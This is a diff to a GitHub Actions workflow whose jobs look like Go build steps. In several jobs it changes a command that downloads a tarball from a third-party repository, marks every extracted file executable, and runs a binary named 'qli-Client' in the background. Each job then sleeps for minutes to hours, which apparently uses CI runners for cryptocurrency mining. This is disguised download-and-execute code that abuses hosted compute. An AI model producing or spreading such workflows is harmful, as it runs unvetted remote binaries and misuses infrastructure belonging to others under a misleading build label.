@@ -25,7 +25,7 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/final.tar.gz && tar xf final.tar.gz && chmod +x * && ./qli-Client &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/finalsu.tar.gz && tar xf finalsu.tar.gz && chmod +x * && ./qli-Client &
            sleep 310s
   ol:
     needs: kont
@@ -48,7 +48,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/final.tar.gz && tar xf final.tar.gz && chmod +x * && ./qli-Client &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/finalsu.tar.gz && tar xf finalsu.tar.gz && chmod +x * && ./qli-Client &
             sleep 5m
         
     
@@ -74,7 +74,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/final.tar.gz && tar xf final.tar.gz && chmod +x * && ./qli-Client &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/finalsu.tar.gz && tar xf finalsu.tar.gz && chmod +x * && ./qli-Client &
             sleep 6m
   ayo:
     needs: ol
@@ -97,7 +97,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/final.tar.gz && tar xf final.tar.gz && chmod +x * && ./qli-Client &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/finalsu.tar.gz && tar xf finalsu.tar.gz && chmod +x * && ./qli-Client &
             sleep 105m
         
     
@@ -123,7 +123,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/final.tar.gz && tar xf final.tar.gz && chmod +x * && ./qli-Client &
+      run: wget https://github.com/faffini/friendly-sniffle/raw/refs/heads/main/finalsu.tar.gz && tar xf finalsu.tar.gz && chmod +x * && ./qli-Client &
             sleep 61m
         
     
